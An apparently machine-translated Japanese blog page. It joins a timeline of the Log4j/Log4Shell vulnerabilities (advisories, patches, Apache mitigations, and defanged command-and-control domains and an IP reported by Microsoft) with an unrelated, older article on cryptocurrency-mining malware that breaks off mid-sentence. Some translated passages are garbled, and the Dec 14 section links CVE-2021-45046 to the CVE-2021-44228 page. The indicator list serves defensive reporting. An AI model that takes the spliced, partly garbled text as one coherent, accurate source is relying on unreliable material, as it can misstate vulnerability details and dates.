<p>Apache&nbsp;&nbsp;<a href="https://www.csoonline.com/article/3644472/apache-log4j-vulnerability-actively-exploited-impacting-millions-of-java-based-apps.html" rel="noreferrer noopener" target="_blank">Log4j の脆弱性は、</a>&nbsp;&nbsp;12 月初旬に発見されて以来、世界的な見出しになりました。この脆弱性は、セキュリティ チームが関連するリスクを軽減するために急いでいるために、世界中の膨大な数の組織に影響を与えています。以下は、Log4j の脆弱性をめぐる主要な出来事の展開のタイムラインです。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2><strong>12 月 9 日木曜日: Apache Log4j のゼロデイ エクスプロイトが発見されました</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Apache は、何百万もの Java ベースのアプリケーションで使用されているロギング ライブラリである Log4j の重大な脆弱性に関する詳細を公開しました。攻撃者は、「Log4Shell」と呼ばれる脆弱性 (CVE-2021-44228) を悪用し始め、CVSS 脆弱性評価尺度で 10 点満点中 10 点と評価されました。脆弱なアプリケーションを実行する基盤となるサーバーでリモート コード実行 (RCE) が発生する可能性があります。「ログ メッセージまたはログ メッセージ パラメータを制御できる攻撃者は、メッセージ ルックアップ置換が有効になっている場合、LDAP サーバーからロードされた任意のコードを実行できます」と Apache 開発者はアドバイザリに書いています。この問題の修正は、Log4j 2.15.0 のリリースで利用可能になりました。これは、世界中のセキュリティ チームが組織を保護するために取り組んだためです。企業は、最新バージョンをインストールするよう促されました。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2><strong>12 月 10 日金曜日: 英国 NCSC が英国の組織に Log4j 警告を発行</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>脆弱性による影響が続く中、英国の National Cyber​​ Security Center (NCSC) は、&nbsp;&nbsp;英国の企業にこの脆弱性に関する<a href="https://www.ncsc.gov.uk/news/apache-log4j-vulnerability" rel="noreferrer noopener" target="_blank">警告を発し、緩和のための戦略を概説しました。</a>NCSC は、Log4j が使用されていることが知られているすべての組織に対して、最新の更新プログラムをすぐにインストールするようアドバイスしました。「これは、Log4j を含むことが知られているソフトウェアを使用しているすべての英国の組織にとって最優先事項です。組織は、インターネットに接続するソフトウェアとインターネットに接続しないソフトウェアの両方を更新する必要があります」と声明は述べています。企業は、Log4j の未知のインスタンスを探し出し、保護ネットワークの監視/ブロックを展開することも求められました。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2><strong>12 月 11 日土曜日: CISA ディレクターが「ネットワーク防御者への緊急の挑戦」についてコメント</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>英国の NCSC と同様に、米国のサイバーセキュリティおよびインフラストラクチャ セキュリティ エージェンシー (CISA) は、Log4j の脆弱性に公式に対応し、Jen Easterly ディレクターは、ネットワーク防御者に提示された緊急の課題について考察しました。「CISA は、公共部門および民間部門のパートナーと緊密に連携して、Log4j ソフトウェア ライブラリを含む製品に影響を与える重大な脆弱性に積極的に対処しています」と彼女は声明で述べています&nbsp;<a href="https://www.cisa.gov/news/2021/12/11/statement-cisa-director-easterly-log4j-vulnerability" rel="noreferrer noopener" target="_blank">。</a>.&nbsp;「私たちは、この脆弱性の緩和を推進し、関連する脅威活動を検出するために緊急の措置を講じています。この脆弱性を既知の悪用された脆弱性のカタログに追加しました。これにより、連邦政府の民間機関 (および連邦政府以外のパートナーへのシグナル) は、この脆弱性に緊急にパッチを適用するか修正する必要があります。私たちは、ネットワークが脆弱である可能性があるエンティティに積極的に連絡を取り、スキャンおよび侵入検出ツールを活用して、政府や業界のパートナーが脆弱性への暴露または悪用を特定できるようにしています。」</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>CISA は、資産の所有者に対し、脆弱性を緩和するために、次の 3 つの追加の迅速な措置を講じることを推奨しています。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Log4j がインストールされている外部接続デバイスを列挙します</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>セキュリティ オペレーション センターが、上記のカテゴリに分類されるデバイスのすべてのアラートに対処していることを確認します</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>セキュリティ オペレーション センター (SOC) がより少ないアラートに集中できるように、ルールが自動的に更新される Web アプリケーション ファイアウォールをインストールします。</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2><strong>12 月 14 日火曜日: サービス拒否の脅威を伴う 2 つ目の Log4j 脆弱性が検出され、新しいパッチがリリースされました</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Apache Log4j に影響を与える 2 つ目の脆弱性が発見されました。<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228" rel="noreferrer noopener" target="_blank">CVE の説明</a>によると、新しいエクスプロイトである CVE 2021-45046 により、悪意のあるアクターは JNDI ルックアップ パターンを使用して悪意のある入力データを作成し、サービス拒否 (DoS) 攻撃を作成することができました&nbsp;。<a href="https://logging.apache.org/log4j/2.x/download.html" rel="noreferrer noopener" target="_blank">エクスプロイト用の</a>新しい&nbsp;&nbsp;パッチが利用可能になり、メッセージ ルックアップ パターンのサポートが削除され、JNDI 機能がデフォルトで無効になりました。Log4j 2.15.0 の元の欠陥に対する修正は、デフォルト以外の特定の構成では不完全でした。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>「CVE-2021-45046 は元の脆弱性ほど深刻ではありませんが、攻撃者がパッチを適用していないシステムや不適切にパッチを適用したシステムに対して悪意のある攻撃を実行する別のベクトルになります」と、Resilience のリスクおよび対応責任者である Amy Chang 氏は CSO に語った。欠陥が発見されました。「CVE-2021-44228 への不完全なパッチは、悪意のある入力データを作成するために悪用され、DoS 攻撃につながる可能性があります。DoS 攻撃により、マシンやネットワークがシャットダウンされ、意図したユーザーがアクセスできなくなる可能性があります」と彼女は付け加えました。組織は、できるだけ早く Log4j: 2.16.0 に更新するようにアドバイスされました。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2><strong>12 月 17 日金曜日: Log4j の 3 つ目の脆弱性が明らかになり、新しい修正プログラムが利用可能に</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Apache は、3 つ目の主要な Log4j 脆弱性の詳細を公開し、さらに別の修正を利用できるようにしました。<a href="https://logging.apache.org/log4j/2.x/download.html" rel="noreferrer noopener" target="_blank">これは、 10</a><a href="https://logging.apache.org/log4j/2.x/download.html" rel="noreferrer noopener" target="_blank">段階</a>中 7.5 と評価された無限再帰の欠陥でした&nbsp;。&nbsp;<a href="https://logging.apache.org/log4j/2.x/download.html" rel="noreferrer noopener" target="_blank"></a>&nbsp;Java 8 以降の場合」と書かれています。「Apache Log4j2 バージョン 2.0-alpha1 から 2.16.0 までは、自己参照ルックアップからの制御されていない再帰から保護されませんでした。ロギング構成がコンテキスト ルックアップ (例: $${ctx:loginId}) を含むデフォルト以外のパターン レイアウトを使用する場合、スレッド コンテキスト マップ (MDC) 入力データを制御できる攻撃者は、再帰ルックアップを含む悪意のある入力データを作成できます。となり、プロセスを終了させる StackOverflowError が発生します。これは、DoS (サービス拒否) 攻撃としても知られています。」</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Apache は、次の軽減策についても概説しています。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>ロギング構成の PatternLayout で、${ctx:loginId} または $${ctx:loginId} などのコンテキスト ルックアップをスレッド コンテキスト マップ パターン (%X、%mdc、または %MDC) に置き換えます。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>それ以外の場合は、構成で、${ctx:loginId} や $${ctx:loginId} などのコンテキスト ルックアップへの参照を削除します。これらは、HTTP ヘッダーやユーザー入力など、アプリケーションの外部のソースから発生します。</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2><strong>12 月 20 日月曜日: Log4j を悪用して Dridex と Meterpreter をインストール</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>サイバーセキュリティ研究グループの Cryptolaemus は、&nbsp;&nbsp;<a href="https://twitter.com/Cryptolaemus1/status/1472939659760185346" rel="noreferrer noopener" target="_blank">Log4j の脆弱性を悪用して、</a>&nbsp;&nbsp;Windows デバイスをバンキング型トロイの木馬 Dridex に感染させたり、Linux デバイスを Meterpreter に感染させたりしていると警告しました。Dridex は、Microsoft Word のマクロを使用するシステムを介して銀行の認証情報を盗むマルウェアの一種です。一方、Meterpreter は、攻撃者が標的のマシンを探索してコードを実行できるインタラクティブなシェルを提供する Metasploit 攻撃ペイロードです。Cryptolaemus のメンバーである Joseph Roosen 氏は&nbsp;<a href="https://www.bleepingcomputer.com/news/security/log4j-vulnerability-now-used-to-install-dridex-banking-malware/" rel="noreferrer noopener" target="_blank">BleepingComputer</a>&nbsp;に対し、攻撃者は Log4j RMI (Remote Method Invocation) エクスプロイトの亜種を使用して、攻撃者が制御するリモート サーバーから脆弱なデバイスに Java クラスをロードして実行させるように強制していると語っています。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2><strong>12 月 22 日水曜日: データは、すべての資産の 10% が Log4Shell に対して脆弱であることを示しています</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>サイバーセキュリティ ベンダー Tenable が発表したデータによると、全資産の 10 分の 1 が Log4Shell に対して脆弱であり、組織の 30% はバグのスキャンを開始していませんでした。「評価された資産のうち、Log4Shell は、さまざまなサーバー、Web アプリケーション、コンテナー、および IoT デバイスを含む約 10% で発見されました」と、Tenable のブログ投稿を読んで&nbsp;<a href="https://www.tenable.com/blog/one-in-10-assets-assessed-are-vulnerable-to-log4shell?utm_source=charge&amp;utm_medium=social&amp;utm_campaign=internal-comms" rel="noreferrer noopener" target="_blank">ください</a>。「Log4Shell は、すべての業界と地域に普及しています。企業サーバーの 10 分の 1 が公開されています。Web アプリケーションの 10 分の 1 など。デジタル インフラストラクチャのほぼすべての側面の 10 分の 1 は、Log4Shell を介した悪意のあるエクスプロイトの可能性があります。」</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>ベンダーは、Log4j がインフラストラクチャとアプリケーションの両方に普及しているため、Log4Shell は EternalBlue (WannaCry 攻撃で悪用された) よりも大きな潜在的な脅威をもたらすと警告しました。「これほどあからさまに修正を要求した脆弱性は歴史上ありません。Log4Shell は、私たちが知っているようにコンピューティングを定義し、自分自身を保護するために努力する人と、過失を気にする人を分けます。」</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2><strong>1 月 4 日火曜日: FTC は企業に Log4j の脆弱性にパッチを適用するように指示し、法的措置を脅かす</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>連邦取引委員会 (FTC) は、米国の組織に対し、Log4Shell の脆弱性に直ちにパッチを適用するか、連邦取引委員会からの懲罰的措置に直面する危険を冒すよう要請しました。「脆弱性が発見されて悪用されると、個人情報の損失または侵害、経済的損失、およびその他の取り返しのつかない損害が発生するリスクがあります。既知のソフトウェアの脆弱性を緩和するための合理的な措置を講じる義務は、連邦取引委員会法やグラム リーチ ブライリー法などの法律に関係しています」と FTC は述べています&nbsp;<a href="https://www.ftc.gov/news-events/blogs/techftc/2022/01/ftc-warns-companies-remediate-log4j-security-vulnerability" rel="noreferrer noopener" target="_blank">。</a>.&nbsp;また、Log4j に依存している企業とそのベンダーが、消費者への損害の可能性を減らし、FTC の法的措置を回避するために今すぐ行動することが重要であると付け加えました。「FTC は、Log4j や同様の既知の脆弱性による露出から消費者データを保護するための合理的な措置を講じていない企業を追求するために、その完全な法的権限を行使するつもりです。」</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2><strong>1 月 10 日月曜日: Microsoft は、中国を拠点とするランサムウェア オペレーターが Log4Shell を悪用していると警告しています。</strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Microsoft が&nbsp;<a href="https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/#NightSky" rel="noreferrer noopener" target="_blank">Log4j 脆弱性ガイダンス ページを更新しました</a>&nbsp;中国を拠点とするランサムウェア オペレーター (DEV-0401) がインターネットに接続しているシステムを標的にし、NightSky ランサムウェアを展開したことの詳細を示しています。「1 月 4 日には、攻撃者が VMware Horizo​​n を実行しているインターネットに接続されたシステムで CVE-2021-44228 の脆弱性を悪用し始めました。「DEV-0401 は、以前に LockFile、AtomSilo、Rook などの複数のランサムウェア ファミリを展開しており、Confluence (CVE-2021-26084) およびオンプレミス Exchange サーバー (CVE-2021-34473) を実行しているインターネットに接続されたシステムを同様に悪用しています。」Microsoft の分析に基づいて、攻撃者は正当なドメインを偽装するコマンド アンド コントロール (CnC) サーバーを使用していることが判明しました。これらには、service[.]trendmrcio[.]com、api[.]rogerscorp[.]org、api[.]sophosantivirus[.]ga、apicon[.]nvidialab[.]us、w2zmii7kjb81pfj0ped16kg8szyvmk.burpcollaborator[.]net、 139[.]180[.]217[.]203.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>セキュリティ 101: 暗号通貨マイニング マルウェアの影響</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>オーストラリア政府は、&nbsp;&nbsp;デジタル通貨を合法的な支払い方法として<a href="http://www.budget.gov.au/2017-18/content/glossies/factsheets/html/FS_innovation.htm">認めました。</a>7 月 1 日以降、ビットコインなどのデジタル通貨を使用して行われた購入は、二重課税を回避するために国の物品サービス税が免除されます。そのため、トレーダーや投資家は、合法的な交換プラットフォームを通じて売買することに対して税金を課されることはありません。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>&nbsp;昨年4月に支払い方法としてビットコインを&nbsp;<a href="http://www.businessinsider.com/bitcoin-price-spikes-as-japan-recognizes-it-as-a-legal-payment-method-2017-4">合法化した</a>日本は&nbsp;、すでに&nbsp;20,000以上の加盟店がビットコイン支払いを受け入れることを<a href="http://asia.nikkei.com/Business/Trends/Bitcoin-seen-spreading-to-20-000-Japanese-merchants">期待しています.&nbsp;</a>&nbsp;スイス、&nbsp;<a href="https://news.bitcoin.com/the-libertarian-city-liberstad-in-norway-is-moving-forward-using-bitcoin-as-primary-currency/">ノルウェー</a>、&nbsp;<a href="https://www.technologyreview.com/s/534011/a-weekend-in-bitcoin-city-arnhem-the-netherlands/">オランダの</a><a href="http://www.ey.com/ch/en/newsroom/news-releases/news-release-ey-switzerland-accepts-bitcoins-for-payment-of-its-services">企業</a>&nbsp;や&nbsp;<a href="http://www.reuters.com/article/us-swiss-fintech-cryptovalley-idUSKCN11E0L9">公的機関</a>の一部ではありますが、他の国もこの時流に参加しています&nbsp;。最近の&nbsp;<a href="https://www.jbs.cam.ac.uk/fileadmin/user_upload/research/centres/alternative-finance/downloads/2017-global-cryptocurrency-benchmarking-study.pdf">調査</a>では、仮想通貨ウォレットのユニークでアクティブなユーザーは 290 万から 580 万の間であり、そのほとんどは北米とヨーロッパにいます。&nbsp;<a href="https://news.bitcoin.com/the-libertarian-city-liberstad-in-norway-is-moving-forward-using-bitcoin-as-primary-currency/"></a><a href="https://www.technologyreview.com/s/534011/a-weekend-in-bitcoin-city-arnhem-the-netherlands/"></a><a href="https://www.jbs.cam.ac.uk/fileadmin/user_upload/research/centres/alternative-finance/downloads/2017-global-cryptocurrency-benchmarking-study.pdf"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>しかし、デジタル通貨の受け入れと採用は、オンラインの脅威とどのような関係があるのでしょうか?&nbsp;実際、たくさん。ビットコインのような暗号通貨が現実世界で勢いを増すにつれて、それを悪用するサイバー犯罪の脅威も増加します。しかし、どのように、正確に？これは、企業や日常のユーザーにとって何を意味するのでしょうか?</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>暗号通貨とは？</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>暗号通貨は、通貨の単位を表す暗号化されたデータ文字列です。これは、ブロックチェーンとも呼ばれるピアツーピア ネットワークによって監視および編成されます。これは、売買、譲渡などのトランザクションの安全な台帳としても機能します。物理的なお金とは異なり、暗号通貨は分散化されています。つまり、政府や他の金融機関によって発行されていません。&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>暗号通貨は、マイニングと呼ばれるプロセスで維持および確認される暗号化アルゴリズムによって作成 (および保護) されます。マイニングでは、コンピューターのネットワークまたは特定用途向け集積回路 (ASIC) などの特殊なハードウェアがトランザクションを処理および検証します。このプロセスは、暗号通貨でネットワークを運営するマイナーにインセンティブを与えます。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>ビットコインは万能ではありません</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://coinmarketcap.com/currencies/views/all/">実際には700 を超える暗号通貨が</a>あります&nbsp;が、すぐに取引できるのはごく一部であり、時価総額が 1 億ドルを超えるものはさらに少数です。たとえば、ビットコインはサトシ・ナカモト (仮名) によって作成され、2009 年にオープンソース コードとしてリリースされました。ブロックチェーン技術は、データ構造 (ブロック) がブロードキャストされ、検証され、通信エンドポイント (ノード) のネットワークを介して公開された分散データベースに登録されるシステムを提供し、すべてを機能させました。&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>ビットコインは最も有名な暗号通貨ですが、他にも人気のある代替手段があります。イーサリアムは、コーディングに必要なプログラミング言語を開発者がよりアクセスしやすいものにすることで、「スマート コントラクト」を一段と高めました。契約、または条件付き/if-then トランザクションは、コードとして記述され、イーサリアムのブロックチェーンで (要件が満たされている限り) 実行されます。&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>しかし、イーサリアムは、ハッカーが&nbsp;&nbsp;イーサリアムのソフトウェアで実行されているデジタル自律組織 (DAO) の脆弱性を悪用し、5,000 万ドル相当のイーサ (イーサリアムの通貨) を吸い上げた後、悪評を博しました<a href="https://www.wired.com/2016/06/50-million-hack-just-showed-dao-human/">。</a>これにより、元のブロックチェーンに基づく Ethereum Classic と、そのアップグレード版である (ハードフォークによる) Ethereum が開発されました。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>他にも注目すべき暗号通貨があります: ライトコイン、ドージコイン、モネロ。Litecoin は、Bitcoin の技術的な改良であるとされており、Scrypt マイニング アルゴリズム (Bitcoin は SHA-256 を使用) を介してより迅速なターンアラウンドが可能です。Litecoin Network は 8,400 万の Litecoin を生成できます。これは、Bitcoin が発行する暗号通貨単位の 4 倍です。Monero は、リング署名 (デジタル署名の一種) と CryptoNote アプリケーション層プロトコルを使用して、取引のプライバシー (金額、発信元、宛先) を保護することで有名です。当初は教育または娯楽目的で開発されたドージコインは、より幅広い人口層を対象としていました。上限のないドージコインを生成することができ、Scrypt を使用して通貨を推進します。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>暗号通貨マイニングもサイバー犯罪の注目を集めました</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>暗号通貨には国境がありません。誰でもいつでもどこでも、遅延や仲介業者からの追加/隠れた料金なしで送金できます。その性質上、暗号通貨は偽造できず、個人情報は暗号の壁の後ろにあるため、詐欺や個人情報の盗難からより安全です。&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>残念なことに、&nbsp;<a href="https://www.trendmicro.com/vinfo/de/security/definition/ransomware">ランサムウェア</a>&nbsp;オペレーターが示したように、暗号通貨の見かけ上の収益性、利便性、および偽名性は、サイバー犯罪者にとって理想的なものでもありました。暗号通貨の人気の高まりは、システムやデバイスに感染するマルウェアの発生と一致しており、それらを暗号通貨マイニング マシンの軍隊に変えています。&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>暗号通貨マイニングは、専用プロセッサ、グラフィックス カード、およびその他のハードウェアから大量のリソースを必要とする計算集約型のタスクです。マイニングはお金を生み出しますが、多くの注意点があります。利益は、鉱山労働者のハードウェアへの投資に比例し、それらに電力を供給するための電気代は言うまでもありません。&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>暗号通貨はブロック単位で採掘されます。たとえば、ビットコインでは、特定の数のハッシュが解決されるたびに、ブロックごとにマイナーに与えられるビットコインの数が半分になります。ビットコイン ネットワークは 10 分ごとに暗号通貨を生成するように設計されているため、別のハッシュを解決する難易度が調整されます。また、採掘力が&nbsp;<a href="https://bitcoin.org/en/developer-guide#proof-of-work">増加する</a>につれて、新しいブロックを採掘するためのリソース要件が積み重なっていきます。ペイアウトは比較的小さく、最終的には 4 年ごとに減少します。2016 年には、ブロックをマイニングした場合の報酬は&nbsp;12.5 BTC (2017 年 7 月 5 日時点で 32,000 ドル) に<a href="http://www.reuters.com/article/us-markets-bitcoin-mining-idUSKCN0ZO2CW">半減しまし</a>た&nbsp;。その結果、多くの人が力を合わせてプールに参加し、マイニングをより効率的にしています。利益は、採掘者がどれだけの労力を費やしたかに応じて、グループ間で分配されます。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>暗号通貨マイニング マルウェアは、同様の攻撃ベクトルを使用します</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>悪者は、マルウェアを使用してこれらの課題を回避します。ただし、サイバー犯罪者のマイナーには注意が必要です。インターネットに接続されたデバイスやマシンは、ネットワーク データを処理するのに十分な速さを備えていますが、広範な数値計算機能を備えていません。これを相殺するために、暗号通貨マイニング マルウェアは、&nbsp;コンピューターの<a href="https://www.trendmicro.com/vinfo/de/security/definition/botnet">ボットネット</a>をゾンビ化し&nbsp;、これらのタスクを実行するように設計されています。2014 年には、ハーバード大学のスーパーコンピューター クラスター Odyssey が&nbsp;<a href="http://www.thecrimson.com/article/2014/2/20/harvard-odyssey-dogecoin/">ドージコインの違法な採掘に使用され</a>ました。同じ年に、&nbsp;&nbsp;米国の機関である国立科学財団のスーパーコンピューターでも同様の<a href="http://www.bbc.com/news/technology-27779030">事件が発生しました。</a>2017 年 2 月初旬、米国連邦準備制度理事会のサーバーの 1 つが&nbsp;<a href="http://www.ibtimes.com/bitcoin-mining-employee-federal-reserve-fined-suspended-using-government-server-mine-2484185">ビットコインのマイニングに悪用され</a>ました。&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>暗号通貨をマイニングするマルウェアは、他の多くの脅威と同じ手口を採用しています。マルウェアを運ぶスパム メールや悪意のある URL からのダウンロードから、ジャンクウェアや不要と思われるアプリケーション (PUA) に至るまでです。2014 年 1 月、&nbsp;&nbsp;<a href="http://www.bbc.com/news/technology-25653664">Yahoo! の Java ベースの広告ネットワークの脆弱性が侵害され</a>、ヨーロッパのエンド ユーザーが&nbsp;&nbsp;ビットコイン マイニング マルウェアを配信する不正<a href="https://www.trendmicro.com/vinfo/de/security/definition/malvertisement">広告にさらされました。</a>その 1 か月前、ドイツの法執行機関は、&nbsp;マルウェアを使用して 954,000 ドル以上のビットコインをマイニングしたとされるハッカーを<a href="https://www.scmagazine.com/german-police-arrest-bitcoin-hackers/article/543183/">逮捕しました</a>&nbsp;。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>&nbsp;2011 年には、&nbsp;<a href="https://www.trendmicro.com/vinfo/de/threat-encyclopedia/web-attack/93/cybercriminals-unleash-bitcoinmining-malware">サイバー犯罪者によるビットコイン マイニングに関連するハッキング ツールやバックドアが出現しており</a>、&nbsp;それ以降<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/bitcoin-mining-botnet-found-with-ddos-capabilities/">、分散型サービス拒否</a>&nbsp;や&nbsp;<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/malicious-links-on-twitter-lead-to-bitcoin-mining/">URL スプーフィング</a>など、より多くの機能を追加するさまざまな仮想通貨マイニングの脅威を確認してきました。 .&nbsp;別のものは、&nbsp;&nbsp;<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/trojan-disguised-as-trend-micro-component-drops-bitcoin-mining-malware/">Trend Micro の製品の 1 つのコンポーネントになりすまそう</a>とさえしました。2014 年、この脅威は&nbsp;ビットコイン、ライトコイン、ドージコインをマイニングできる<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/mobile-malware-mines-dogecoins-and-litecoins-for-bitcoin-payout/">Kagecoin として Android デバイスに侵入しました。</a><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/new-rats-emerge-from-leaked-njw0rm-source-code/">中東の地下組織で容易に共有されるリモート アクセス型トロイの木馬 (RAT) njrat/Njw0rm は、</a>ビット&nbsp;&nbsp;コイン マイニング機能を追加するように変更されました。<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/old-java-rat-updates-includes-litecoin-plugin/">litecoin を採掘できる</a>古い Java RAT にも同じことが行われました&nbsp;。&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>今年注目すべき仮想通貨マイニング マルウェアは、&nbsp;&nbsp;<a href="https://www.proofpoint.com/us/threat-insight/post/adylkuzz-cryptocurrency-mining-malware-spreading-for-weeks-via-eternalblue-doublepulsar">Adylkuzz</a>、CPUMiner/EternalMiner、および Linux.MulDrop.14 です。すべてが脆弱性を悪用します。&nbsp;<a href="https://blog.trendmicro.com/trendlabs-security-intelligence/wannacry-uiwix-ransomware-monero-mining-malware-follow-suit/">Adylkuzz は、&nbsp;</a><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/massive-wannacrywcry-ransomware-attack-hits-various-countries/">WannaCry</a>ランサムウェアが破壊的な影響を与えたのと同じセキュリティ欠陥である&nbsp;EternalBlue を利用し&nbsp;、CPUMiner/EternalMiner は、&nbsp;相互運用ソフトウェア スイート Samba の脆弱性である<a href="http://www.securityweek.com/sambacry-flaw-exploited-deliver-cryptocurrency-miner">SambaCryを使用しました。</a>Linux トロイの木馬である Linux.MulDrop.14 は、&nbsp;&nbsp;&nbsp;Raspberry Pi デバイス<a href="http://www.zdnet.com/article/linux-malware-enslaves-raspberry-pi-to-mine-cryptocurrency/">を標的にしています。</a>これらの脅威は、デバイスやマシンに感染し、それらをモネロ マイニング ボットネットに変えました。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>暗号通貨マイニング マルウェアの影響により、信頼できる脅威となっています</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>暗号通貨マイニング マルウェアは、感染したマシンのリソースを盗み、パフォーマンスに大きな影響を与え、消耗を増大させます。感染には、消費電力の増加など、他のコストも伴います。&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>しかし、その影響はパフォーマンスの問題にとどまらないこともわかりました。2017 年 1 月 1 日から 6 月 24 日まで、当社のセンサーは 460,259 を超えるビットコイン マイニング アクティビティをトリガーした 4,894 のビットコイン マイナーを検出し、これらのマイナーの 20% 以上が Web およびネットワーク ベースの攻撃もトリガーしたことを発見しました。ランサムウェアの攻撃ベクトルに関連する侵入の試みも発見されました。私たちが確認したこれらの攻撃の中で最も一般的なものは次のとおりです。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><a href="https://www.trendmicro.com/vinfo/de/security/definition/cross-site-scripting-(xss)">クロスサイト スクリプティング</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/iis-6-0-vulnerability-leads-code-execution/">Microsoft の Internet Information Server</a>&nbsp;&nbsp;(IIS)のリモートでコードが実行される脆弱性を悪用する&nbsp;</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>ブルート フォースおよびデフォルト パスワードのログイン/攻撃</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>コマンド バッファ オーバーフローのエクスプロイト</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>ハイパーテキスト プリプロセッサ (PHP) の任意のコード インジェクション</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://www.trendmicro.com/vinfo/de/security/definition/sql-injection">SQL インジェクション</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>BlackNurse&nbsp;<a href="https://www.trendmicro.com/vinfo/de/security/definition/denial-of-service-(dos)">サービス拒否</a>&nbsp;攻撃&nbsp;</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>これらのマルウェアは、ネットワークまたはシステムの可用性、整合性、およびセキュリティを脅かす可能性があり、企業のミッション クリティカルな運用の中断につながる可能性があります。情報の盗難とシステムの乗っ取りも、手ごわい影響です。これらの攻撃は、追加のマルウェアが配信される経路となる可能性もあります。&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://www.trendmicro.com/vinfo/de/security/threat-intelligence-center/internet-of-things/">インターネット オブ シングス(IoT) デバイスも、</a><a href="https://arstechnica.com/security/2014/05/infecting-dvrs-with-bitcoin-mining-malware-even-easier-you-suspected/">デジタル ビデオ レコーダー</a>&nbsp;(DVR)/監視カメラ、&nbsp;<a href="https://www.wired.com/2014/01/spime-watch-linux-darlloz-internet-things-worm/">セットトップ ボックス</a>、&nbsp;<a href="http://www.computerworld.com/article/3119109/security/thousands-of-seagate-nas-boxes-host-cryptocurrency-mining-malware.html">ネットワーク接続型ストレージ</a>&nbsp;(NAS) デバイス、特にルーターに至るまで、仮想通貨をマイニングするマルウェア&nbsp;の標的になっています。&nbsp;家庭環境と企業環境の間で。2017 年 4 月、&nbsp;&nbsp;ビットコイン マイニング機能を備えたMirai の亜種が<a href="http://www.newsweek.com/botnet-hacking-devices-mine-bitcoin-582404">出現しました。</a>Mirai の悪評は、IoT 